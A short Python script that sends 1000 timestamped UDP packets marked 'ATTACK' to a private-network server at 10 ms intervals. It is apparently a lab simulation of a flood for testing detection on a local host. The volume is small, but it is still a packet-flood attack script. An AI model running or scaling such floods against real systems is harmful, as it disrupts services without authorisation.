import socket
import json
import time 
from datetime import datetime

serverport = 5002
serverIP = '10.245.30.236'
bufferSize = 1024

client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

messages = ["ATTACKER"]


try:
    for msg in messages:
        for i in range (1000):
            payload = {
                "content": "ATTACK",
                "sent_at":datetime.now().isoformat()}
        
        
            client.sendto(json.dumps(payload).encode(), (serverIP, serverport))
            print(f"Attack packet {i+1} sent at {payload['sent_at']}")
            time.sleep(0.01)
        
except Exception as e:
    print(f"Error: {e}")
finally:
    client.close()
    print("Attack done.")
        
